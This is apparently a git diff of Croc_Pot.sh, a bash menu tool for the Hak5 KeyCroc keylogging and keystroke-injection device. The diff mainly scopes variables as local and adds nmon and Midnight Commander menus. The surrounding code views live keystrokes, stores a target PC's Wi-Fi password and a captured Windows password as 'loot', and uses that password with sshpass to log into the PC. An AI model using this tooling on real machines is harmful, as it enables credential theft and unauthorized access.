@@ -3913,7 +3918,7 @@ Add-Type -AssemblyName System.Windows.Forms\nAdd-type -AssemblyName System.Drawi
 	 ATTACKMODE HID
 	fi
 else
-    HOST_CHECK=$(sed -n 3p ${CROC_OS})
+    local HOST_CHECK=$(sed -n 3p ${CROC_OS})
       case $HOST_CHECK in
            raspberrypi)
                       Q ALT-F4
@@ -4001,7 +4006,7 @@ MenuEnd
         4) croc_unlock_p ; menu_B ;;
         5) wifi_setup_p ; menu_B ;;
         6) nmap_menu ;;
-        7) windows_check ; cat ${LOOT_WIND} ; menu_B ;;
+        7) windows_check ; menu_B ;;
         8) croc_vpn ; menu_B ;;
         9) pass_time ; menu_B ;;
        10) windows_defender ; menu_B ;;
@@ -4020,7 +4025,7 @@ menu_B
 
 function croc_status() {
 	croc_title
-	server_name=$(hostname)
+	local server_name=$(hostname)
 
 memory_check() {
     echo -ne "\n\e[40m$(ColorYellow 'Memory usage on') ${server_name} is:${clear}\n"
@@ -4028,7 +4033,8 @@ memory_check() {
     free -t -m
     cat /proc/meminfo
     vmstat
-    df -h 
+    df -h
+    iostat
 }
 
 cpu_check() {
@@ -4064,7 +4070,7 @@ processes_check() {
 ##
 
 all_checks() {
-    LOOT_INFO=/root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt
+    local LOOT_INFO=/root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt
     rm -f ${LOOT_INFO}
     croc_title_loot >> ${LOOT_INFO}
 echo -ne "\t${LINE_}KEYCROC INFO${LINE_}\n${LINE}\nCROC FIRMWARE: $(cat /root/udisk/version.txt)\nKEYCROC CONFIG SETTING:\n$(sed -n '/^[DWS]/p' /root/udisk/config.txt)\n${LINE}\nUSER NAME: $(whoami)\nHOSTNAME: $(cat /proc/sys/kernel/hostname)
@@ -4081,10 +4087,10 @@ ${LINE}\nRUNNING SERVICES:\n$(service --status-all)\n${LINE}\nINSTALLED PACKAGES
 ##
 
 pc_info() {
-    CROC_OS=/root/udisk/loot/Croc_OS.txt
-    OS_CHECK=$(sed -n 1p ${CROC_OS})
+    local CROC_OS=/root/udisk/loot/Croc_OS.txt
+    local OS_CHECK=$(sed -n 1p ${CROC_OS})
     if [ "${OS_CHECK}" = WINDOWS ]; then
-    CROC_OS_WIND=/root/udisk/loot/Croc_OS_wind.txt
+    local CROC_OS_WIND=/root/udisk/loot/Croc_OS_wind.txt
 echo -ne "\n$(ColorYellow 'KeyCroc is pluged into:') $(sed -n 1p ${CROC_OS})
 $(ColorYellow 'PC Host name is:') $(sed -n 3p ${CROC_OS})
 $(ColorYellow 'KeyCroc eth0 IP is:') $(sed -n 2p ${CROC_OS})
@@ -4094,7 +4100,7 @@ $(ColorYellow 'Pc SSID + PASSWD and MAC address is:')
 $(sed '9,24!d' ${CROC_OS_WIND})\n"
 else
     if [ "${OS_CHECK}" = LINUX ]; then
-    croc_os_v=/root/udisk/loot/Croc_OS_ip.txt
+    local croc_os_v=/root/udisk/loot/Croc_OS_ip.txt
 echo -ne "\n$(ColorYellow 'KeyCroc is pluged into:') $(sed -n 1p ${CROC_OS})
 $(ColorYellow 'PC Host name is:') $(sed -n 3p ${CROC_OS})
 $(ColorYellow 'KeyCroc eth0 IP is:') $(sed -n 2p ${CROC_OS})
@@ -4121,21 +4127,46 @@ keystorkes_V() {
 }
 
 ##
+#   - nmon monitoring system
+##
+
+nmon_system() {
+	local pkg=nmon
+    local status="$(dpkg-query -W --showformat='${db:Status-Status}' "$pkg" 2>&1)"
+if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
+	echo -ne "\e[40m$(ColorBlue 'INSTALL NMON MONITORING YES OR NO AND PRESS [ENTER] ')${clear}"; read mn
+	case $mn in
+	  [yY] | [yY][eE][sS] )
+	                       apt install nmon
+	                       echo -ne "\n\e[40m$(ColorGreen 'NMON MONITORING IS NOW INSTALLED')\n${clear}" ;;
+	      [nN] | [nN][oO] )
+	                       echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
+	                    * )
+	                       invalid_entry ; nmon_system ;;
+	esac
+else
+    echo -ne "\n\e[40m$(ColorGreen 'NMON MONITORING IS INSTALLED')\n${clear}"
+fi
+nmon
+}
+
+##
 #   - Croc Status Menu
 ##
 
 menu_A() {
 	LED B
 MenuTitle KEYCROC STATUS MENU
-MenuColor 1 MEMORY USAGE ; echo -ne "             ${clear}\n"
-MenuColor 2 CPU LOAD ; echo -ne "                 ${clear}\n"
-MenuColor 3 NUMBER OF TCP CONNECTIONS ; echo -ne "  ${clear}\n"
-MenuColor 4 KERNEL VERSION ; echo -ne "           ${clear}\n"
-MenuColor 5 RUNNING PROCESSES ; echo -ne "        ${clear}\n"
-MenuColor 6 CHECK ALL ; echo -ne "                ${clear}\n"
-MenuColor 7 CONNECTED PC INFO ; echo -ne "         ${clear}\n"
-MenuColor 8 VIEW LIVE KEYSTORKES ; echo -ne "      ${clear}\n"
-MenuColor 9 RETURN TO MAIN MENU ; echo -ne "        ${clear}\n"
+MenuColor  1 MEMORY USAGE ; echo -ne "             ${clear}\n"
+MenuColor  2 CPU LOAD ; echo -ne "                 ${clear}\n"
+MenuColor  3 NUMBER OF TCP CONNECTIONS ; echo -ne "  ${clear}\n"
+MenuColor  4 KERNEL VERSION ; echo -ne "           ${clear}\n"
+MenuColor  5 RUNNING PROCESSES ; echo -ne "        ${clear}\n"
+MenuColor  6 CHECK ALL ; echo -ne "                ${clear}\n"
+MenuColor  7 CONNECTED PC INFO ; echo -ne "         ${clear}\n"
+MenuColor  8 VIEW LIVE KEYSTORKES ; echo -ne "      ${clear}\n"
+MenuColor  9 START NMON MONITORING ; echo -ne "     ${clear}\n"
+MenuColor 10 RETURN TO MAIN MENU ; echo -ne "       ${clear}\n"
 MenuEnd
         read a_c
         case $a_c in
@@ -4147,7 +4178,8 @@ MenuEnd
         6) all_checks ; menu_A ;;
         7) pc_info ; menu_A ;;
         8) keystorkes_V ; menu_A ;;
-        9) main_menu ;;
+        9) nmon_system ; menu_A ;;
+        10) main_menu ;;
         0) exit 0 ;;
         *) invalid_entry ; menu_A ;;
         esac
@@ -4174,7 +4206,7 @@ edit_payload() {
     ls -aRd $PWD/* --color=auto
     echo ""
     read -p "$(ColorBlue 'ENTER THE PAYLOAD NAME TO EDIT AND PRESS [ENTER]:') " user_payload
-    USER_PAYLOAD_V=${user_payload}
+    local USER_PAYLOAD_V=${user_payload}
     if [ -e "${USER_PAYLOAD_V}" ]; then
     nano ${USER_PAYLOAD_V}
 else
@@ -4192,7 +4224,7 @@ edit_tools() {
     ls -aRd $PWD/* --color=auto
     echo ""
     read -p "$(ColorBlue 'ENTER THE FILE NAME TO EDIT AND PRESS [ENTER]:') " user_tools
-    USER_TOOLS_V=${user_tools}
+    local USER_TOOLS_V=${user_tools}
     if [ -e "${USER_TOOLS_V}" ]; then
     nano ${USER_TOOLS_V}
 else
@@ -4210,7 +4242,7 @@ edit_loot() {
     ls -aRd $PWD/* --color=auto
     echo ""
     read -p "$(ColorBlue 'ENTER THE FILE NAME TO EDIT AND PRESS [ENTER]:') " user_loot
-    USER_LOOT_V=${user_loot}
+    local USER_LOOT_V=${user_loot}
     if [ -e "${USER_LOOT_V}" ]; then
     nano ${USER_LOOT_V}
 else
@@ -4223,7 +4255,7 @@ fi
 ##
 
 edit_config() {
-    USER_CONFIG_V=/root/udisk/config.txt
+    local USER_CONFIG_V=/root/udisk/config.txt
     if [ -e "${USER_CONFIG_V}" ]; then
     nano ${USER_CONFIG_V}
 else
@@ -4241,7 +4273,7 @@ user_file() {
     ls -R --color=auto
     echo ""
     read -p "$(ColorBlue 'ENTER THE PATH TO FILE NAME TO EDIT AND PRESS [ENTER]:') " file_edit
-    USER_FILE_V=${file_edit}
+    local USER_FILE_V=${file_edit}
     if [ -e "${USER_FILE_V}" ]; then
     nano ${USER_FILE_V}
 else
@@ -4259,7 +4291,7 @@ remove_file() {
 	ls -R --color=auto
 	echo ""
 	read -p "$(ColorRed 'ENTER THE PATH TO FILE NAME YOU WISH TO REMOVE AND PRESS [ENTER]:') " remove_edit
-	REMOVE_FILE_V=${remove_edit}
+	local REMOVE_FILE_V=${remove_edit}
 	if [ -e "${REMOVE_FILE_V}" ]; then
 	LED R
 	echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'This file will be removed') ${REMOVE_FILE_V}${clear}"${LINE_}
@@ -4267,6 +4299,80 @@ remove_file() {
 else
 	invalid_entry
 fi
+}
+
+##
+#   - midnight commander, visual file manager
+##
+
+midnight_manager() {
+	clear
+	echo -ne "$(Info_Screen '
+- Midnight Commander, visual file manager\n
+- Check link below on How to use\n
+- https://www.linode.com/docs/guides/how-to-install-midnight-commander\n')${clear}\n"
+
+##
+#   - midnight install function
+##
+
+mc_install() {
+	local pkg=mc
+    local status="$(dpkg-query -W --showformat='${db:Status-Status}' "$pkg" 2>&1)"
+if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
+	echo -ne "\e[40m$(ColorBlue 'INSTALL MIDNIGHT COMMANDER YES OR NO AND PRESS [ENTER] ')${clear}"; read mc
+	case $mc in
+	  [yY] | [yY][eE][sS] )
+	                       apt install mc
+	                       echo -ne "\n\e[40m$(ColorGreen 'MIDNIGHT COMMANDER IS NOW INSTALLED')\n${clear}" ;;
+	      [nN] | [nN][oO] )
+	                       echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
+	                    * )
+	                       invalid_entry ; mc_install ;;
+	esac
+else
+    echo -ne "\n\e[40m$(ColorGreen 'MIDNIGHT COMMANDER IS INSTALLED')\n${clear}"
+fi
+}
+
+##
+#   - midnight remove function
+##
+
+mc_remove() {
+	echo -ne "\e[40m$(ColorBlue 'REMOVE MIDNIGHT COMMANDER YES OR NO AND PRESS [ENTER] ')${clear}"; read mcr
+	case $mcr in
+	[yY] | [yY][eE][sS] )
+	                     apt-get remove mc
+	                     apt-get autoremove
+	                     echo -ne "\n\e[40m$(ColorGreen 'MIDNIGHT COMMANDER IS NOW REMOVED')\n${clear}" ;;
+	    [nN] | [nN][oO] )
+	                     echo -ne "\n\e[40m$(ColorYellow 'KEEPING MIDNIGHT COMMANDER')\n${clear}" ;;
+	                  * )
+	                     invalid_entry ; mc_remove ;;
+	esac
+}
+
+##
+#   - midnight Menu
+##
+
+MenuTitle MIDNIGHT COMMANDER MENU
+MenuColor 1 INSTALL MIDNIGHT COMMANDER ; echo -ne "${clear}\n"
+MenuColor 2 REMOVE MIDNIGHT COMMANDER ; echo -ne " ${clear}\n"
+MenuColor 3 START MIDNIGHT COMMANDER ; echo -ne "  ${clear}\n"
+MenuColor 4 RETURN TO MAIN MENU ; echo -ne "        ${clear}\n"
+MenuEnd
+    read c_m
+    case $c_m in
+	1) mc_install ; midnight_manager ;;
+	2) mc_remove ; midnight_manager ;;
+	3) mc ; midnight_manager ;;
+	4) main_menu ;;
+	0) exit 0 ;;
+	*) invalid_entry ; midnight_manager ;;
+	esac
+
 }
 
 ##
@@ -4284,7 +4390,8 @@ MenuColor  6 CROC REMOVE FILES ; echo -ne "     ${clear}\n"
 MenuColor  7 ATTACKMODE HID STORAGE ; echo -ne "${clear}\n"
 MenuColor  8 ATTACKMODE HID ; echo -ne "       ${clear}\n"
 MenuColor  9 RELOAD_PAYLOADS ; echo -ne "     ${clear}\n"
-MenuColor 10 RETURN TO MAIN MENU ; echo -ne "   ${clear}\n"
+MenuColor 10 MIDNIGHT MANAGER ; echo -ne "    ${clear}\n"
+MenuColor 11 RETURN TO MAIN MENU ; echo -ne "   ${clear}\n"
 MenuEnd
         read a_b
         case $a_b in
@@ -4297,7 +4404,8 @@ MenuEnd
         7) ATTACKMODE HID STORAGE ; croc_edit_menu ;;
         8) ATTACKMODE HID ; croc_edit_menu ;;
         9) RELOAD_PAYLOADS ; croc_edit_menu ;;
-       10) main_menu ;;
+       10) midnight_manager ; croc_edit_menu ;;
+       11) main_menu ;;
         0) exit 0 ;;
         *) invalid_entry ; croc_edit_menu ;;
         esac
@@ -4308,7 +4416,7 @@ MenuEnd
 ##
 
 function ssh_menu() {
-	hak_gear=/root/udisk/tools/CROC_POT/Hak5Gear.txt
+	local hak_gear=/root/udisk/tools/CROC_POT/Hak5Gear.txt
 	LED B
 	clear
 	echo -ne "$(Info_Screen '
@@ -4358,8 +4466,8 @@ This will install (sshpass) package to the keycroc used for enter passwd once\n
 First time ssh for Keycroc to hak5 gear you will need to authentication ssh\n
 before (sshpass) will work\n')${clear}\n"
 > ${hak_gear}
-pkg=sshpass
-status="$(dpkg-query -W --showformat='${db:Status-Status}' "$pkg" 2>&1)"
+local pkg=sshpass
+local status="$(dpkg-query -W --showformat='${db:Status-Status}' "$pkg" 2>&1)"
 if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
   apt install $pkg
 fi
@@ -4376,7 +4484,7 @@ hak_list BASH BUNNY ; hak_passwd
 ##
 
 pc_pw() {
-	pw_check=/root/udisk/loot/Croc_Pot/winpasswd.txt
+	local pw_check=/root/udisk/loot/Croc_Pot/winpasswd.txt
 	if [ -e "${pw_check}" ]; then
 	    echo -ne "$(ColorYellow 'Have An save Passwd we will try this:') $(sed '$!d' ${pw_check})\n"
 	else
@@ -4389,11 +4497,11 @@ pc_pw() {
 ##
 
 pc_ssh() {
-	CROC_OS=/root/udisk/loot/Croc_OS.txt
-	OS_CHECK=$(sed -n 1p ${CROC_OS})
+	local CROC_OS=/root/udisk/loot/Croc_OS.txt
+	local OS_CHECK=$(sed -n 1p ${CROC_OS})
 	pc_pw
 	if [ "${OS_CHECK}" = WINDOWS ]; then
-	CROC_OS_WIND=/root/udisk/loot/Croc_OS_wind.txt
+	local CROC_OS_WIND=/root/udisk/loot/Croc_OS_wind.txt
 #	$(sed -i 's/\r//g' ${CROC_OS_WIND})
 echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p ${CROC_OS_WIND})
 \t$(ColorYellow 'The PC IP is:') $(sed -n 2p ${CROC_OS_WIND})
@@ -4401,7 +4509,7 @@ echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p ${CROC_OS_WIND})
     sshpass -p $(sed '$!d' ${pw_check}) ssh $(sed -n 1p ${CROC_OS_WIND})@$(sed -n 2p ${CROC_OS_WIND})
 else
 	if [ "${OS_CHECK}" = LINUX ]; then
-	CROC_OS_V=/root/udisk/loot/Croc_OS_ip.txt
+	local CROC_OS_V=/root/udisk/loot/Croc_OS_ip.txt
 echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p ${CROC_OS_V})
 \t$(ColorYellow 'The PC IP is:') $(sed -n 2p ${CROC_OS_V})
 \t$(ColorGreen 'Starting SSH with connected PC')\n"
@@ -4446,8 +4554,8 @@ fi
 
 pine_web() {
 	echo -ne "\n\e[40m$(ColorYellow 'Starting WIFI Pineapple web page')\n${clear}"
-	CROC_OS=/root/udisk/loot/Croc_OS.txt
-	OS_CHECK=$(sed -n 1p ${CROC_OS})
+	local CROC_OS=/root/udisk/loot/Croc_OS.txt
+	local OS_CHECK=$(sed -n 1p ${CROC_OS})
 	if [ "${OS_CHECK}" = WINDOWS ]; then
 	   Q GUI d
 	   Q GUI r
@@ -4463,7 +4571,7 @@ pine_web() {
 	   Q STRING "exit"
 	   Q ENTER
 else
-    HOST_CHECK=$(sed -n 3p ${CROC_OS})
+    local HOST_CHECK=$(sed -n 3p ${CROC_OS})
       case $HOST_CHECK in
            raspberrypi)
                       Q GUI d
@@ -4616,8 +4724,8 @@ ssh_bunny() {
 	   echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'ENTER BASH BUNNY PASSWD')${clear}"${LINE_}
 	   pw_list
 	fi
-	   CROC_OS=/root/udisk/loot/Croc_OS.txt
-	   OS_CHECK=$(sed -n 1p ${CROC_OS})
+	   local CROC_OS=/root/udisk/loot/Croc_OS.txt
+	   local OS_CHECK=$(sed -n 1p ${CROC_OS})
 	if [ "${OS_CHECK}" = WINDOWS ]; then
 	   Q GUI d
 	   Q GUI r
@@ -4628,7 +4736,7 @@ ssh_bunny() {
 	   Q STRING "ssh root@172.16.64.1"
 	   Q ENTER
 else
-    HOST_CHECK=$(sed -n 3p ${CROC_OS})
+    local HOST_CHECK=$(sed -n 3p ${CROC_OS})
       case $HOST_CHECK in
            raspberrypi)
                       Q GUI d
@@ -4740,8 +4848,8 @@ fi
 
 hak_factory() {
 	echo -ne "\n\e[40m$(ColorYellow 'Open Hak5 factory recovery web page')\n${clear}"
-	CROC_OS=/root/udisk/loot/Croc_OS.txt
-	OS_CHECK=$(sed -n 1p ${CROC_OS})
+	local CROC_OS=/root/udisk/loot/Croc_OS.txt
+	local OS_CHECK=$(sed -n 1p ${CROC_OS})
 	if [ "${OS_CHECK}" = WINDOWS ]; then
 	   Q GUI d
 	   Q GUI r
@@ -4757,7 +4865,7 @@ hak_factory() {
 	   Q STRING "exit"
 	   Q ENTER
 else
-    HOST_CHECK=$(sed -n 3p ${CROC_OS})
+    local HOST_CHECK=$(sed -n 3p ${CROC_OS})
       case $HOST_CHECK in
            raspberrypi)
                       Q GUI d
@@ -4864,7 +4972,7 @@ remove_croc_pot() {
     echo -ne "\e[40m$(ColorRed 'ARE YOU SURE YOU WANT TO REMOVE CROCPOT TYPE YES OR NO AND PRESS [ENTER]:')${clear} "; read CROC_POT_REMOVE
     case $CROC_POT_REMOVE in
   [yY] | [yY][eE][sS] )
-	apt -y remove unzip openvpn sshpass
+	apt -y remove unzip openvpn sshpass mc nmon
 	rm -r /var/hak5c2 /root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot
 	rm /usr/local/bin/c2-3.1.2_armv7_linux /etc/systemd/system/hak5.service
 	rm /root/udisk/tools/kc_fw_1.3_510.tar.gz /root/udisk/payloads/Croc_Pot_Payload.txt
@@ -4872,6 +4980,7 @@ remove_croc_pot() {
 	rm /root/udisk/payloads/Getonline.txt /root/udisk/payloads/Quick_Start_C2.txt
 	rm /root/udisk/loot/Croc_OS.txt /root/udisk/loot/Croc_OS_ip.txt
 	rm /root/udisk/tools/Croc_Pot.sh /root/udisk/payloads/Croc_Shot.txt
+	apt-get autoremove
 	exit 0 ;;
   [nN] | [nN][oO] )
     echo -e "\n\e[40m$(ColorYellow 'Return Back to main menu')${clear} "
@@ -4952,8 +5061,8 @@ same network as the keycroc and connect to HAK5 C2\n')${clear}\n"
 ##
 
 cloud_setup() {
-	pkg_zip=unzip
-	status_zip="$(dpkg-query -W --showformat='${db:Status-Status}' "$pkg_zip" 2>&1)"
+	local pkg_zip=unzip
+	local status_zip="$(dpkg-query -W --showformat='${db:Status-Status}' "$pkg_zip" 2>&1)"
 	if [ ! $? = 0 ] || [ ! "$status_zip" = installed ]; then
 	apt install $pkg_zip
 	fi
@@ -4990,8 +5099,8 @@ ExecStart=/usr/local/bin/c2-3.1.2_armv7_linux -hostname $(ifconfig wlan0 | grep 
 ##
 
 start_web() {
-	CROC_OS=/root/udisk/loot/Croc_OS.txt
-	OS_CHECK=$(sed -n 1p ${CROC_OS})
+	local CROC_OS=/root/udisk/loot/Croc_OS.txt
+	local OS_CHECK=$(sed -n 1p ${CROC_OS})
 	if [ "${OS_CHECK}" = WINDOWS ]; then
 	   Q GUI d
 	   Q GUI r
@@ -5007,7 +5116,7 @@ start_web() {
 	   Q STRING "exit"
 	   Q ENTER
 else
-    HOST_CHECK=$(sed -n 3p ${CROC_OS})
+    local HOST_CHECK=$(sed -n 3p ${CROC_OS})
       case $HOST_CHECK in
            raspberrypi)
                       Q GUI d
@@ -5076,7 +5185,7 @@ remove_cloud() {
 ##
 
 quick_cloud() {
-	quickcloud=/root/udisk/payloads/Quick_Start_C2.txt
+	local quickcloud=/root/udisk/payloads/Quick_Start_C2.txt
 	clear
 	echo -ne "$(Info_Screen '
 -Will need to install Cloud C2 frist\n
@@ -5111,7 +5220,7 @@ save_ip() {
 - #3 Manually add IP,Netmask,Gateway\n')${clear}\n"
 
 save_setup() {
-	cloud_ip=/root/udisk/tools/Croc_Pot/C2_IP.txt
+	local cloud_ip=/root/udisk/tools/Croc_Pot/C2_IP.txt
 
 run_save_v() {
 	ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6- | tee ${cloud_ip}
@@ -5243,14 +5352,14 @@ function main_menu() {
 	clear
 	croc_title
 MenuTitle CROC POT MAIN MENU
-MenuColor 1 CROC MAIL ; echo -ne "     ${clear}\n"
-MenuColor 2 CROC POT PLUS ; echo -ne "  ${clear}\n"
-MenuColor 3 KEYCROC STATUS ; echo -ne "${clear}\n"
-MenuColor 4 KEYCROC LOGS ; echo -ne "  ${clear}\n"
-MenuColor 5 KEYCROC EDIT ; echo -ne "  ${clear}\n"
-MenuColor 6 SSH MENU ; echo -ne "      ${clear}\n"
-MenuColor 7 RECOVERY MENU ; echo -ne " ${clear}\n"
-MenuColor 8 HAK5 CLOUD C2 ; echo -ne "  ${clear}\n"
+MenuColor 1 CROC MAIL ; echo -ne "     ${blue}\U2709${clear}\n"
+MenuColor 2 CROC POT PLUS ; echo -ne "  ${red}∞${clear}\n"
+MenuColor 3 KEYCROC STATUS ; echo -ne "${green}✓${clear}\n"
+MenuColor 4 KEYCROC LOGS ; echo -ne "  ∵${clear}\n"
+MenuColor 5 KEYCROC EDIT ; echo -ne "  ${yellow}✏${clear}\n"
+MenuColor 6 SSH MENU ; echo -ne "      ${blue}⇆${clear}\n"
+MenuColor 7 RECOVERY MENU ; echo -ne " ${green}♲${clear}\n"
+MenuColor 8 HAK5 CLOUD C2 ; echo -ne "  ${white}☁${clear}\n"
 MenuEnd
     read a
     case $a in
